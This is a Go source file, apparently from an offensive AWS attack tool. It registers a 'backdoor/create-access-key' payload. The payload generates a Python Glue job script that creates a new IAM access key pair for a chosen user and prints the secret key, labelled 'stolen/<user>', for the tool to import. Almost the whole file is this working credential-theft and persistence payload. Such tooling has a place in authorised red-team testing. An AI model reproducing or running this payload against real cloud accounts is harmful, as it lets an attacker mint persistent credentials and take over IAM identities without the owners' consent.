package glue

import (
	"fmt"
	"pathrunner/pkg/modules"
	"pathrunner/pkg/payloads"
)

// BackdoorCreateAccessKeyPayload generates a Glue Python Shell script that creates
// a new access key pair for an existing IAM user. Credentials are printed to stdout
// using PATHFINDER_IDENTITY_DATA markers for auto-import.
type BackdoorCreateAccessKeyPayload struct{}

func init() {
	payloads.Register(&BackdoorCreateAccessKeyPayload{})
}

func (p *BackdoorCreateAccessKeyPayload) GetName() string {
	return "backdoor/create-access-key"
}

func (p *BackdoorCreateAccessKeyPayload) GetDescription() string {
	return "Create new access keys for an existing IAM user via Glue job"
}

func (p *BackdoorCreateAccessKeyPayload) GetTags() []string {
	return []string{
		payloads.TagServiceGlue,
		payloads.TagLanguagePython,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorCreateAccessKeyPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_USER",
			Description: "IAM username to create access keys for",
			Required:    true,
		},
	}
}

func (p *BackdoorCreateAccessKeyPayload) Validate(options map[string]string) error {
	if options["TARGET_USER"] == "" {
		return fmt.Errorf("TARGET_USER is required for backdoor/create-access-key payload")
	}
	return nil
}

func (p *BackdoorCreateAccessKeyPayload) GenerateCode(options map[string]string) (string, error) {
	targetUser := options["TARGET_USER"]

	code := fmt.Sprintf(`import boto3
import sys

target_user = '%s'

# Override from job arguments if provided
for i, arg in enumerate(sys.argv):
    if arg == '--TARGET_USER' and i + 1 < len(sys.argv):
        target_user = sys.argv[i + 1]

iam = boto3.client('iam')

try:
    key_response = iam.create_access_key(UserName=target_user)
    access_key = key_response['AccessKey']

    print(f"Created access key for {target_user}")
    print(f"--- PATHFINDER_IDENTITY_DATA ---")
    print(f"NAME=stolen/{target_user}")
    print(f"TYPE=keys")
    print(f"ACCESS_KEY_ID={access_key['AccessKeyId']}")
    print(f"SECRET_ACCESS_KEY={access_key['SecretAccessKey']}")
    print(f"AUTO_SWITCH=false")
    print(f"--- END_PATHFINDER_IDENTITY_DATA ---")

except Exception as e:
    print(f"Error creating access key: {e}")
    raise
`, targetUser)

	return code, nil
}

func (p *BackdoorCreateAccessKeyPayload) ProcessResult(result string) (string, error) {
	return result, nil
}
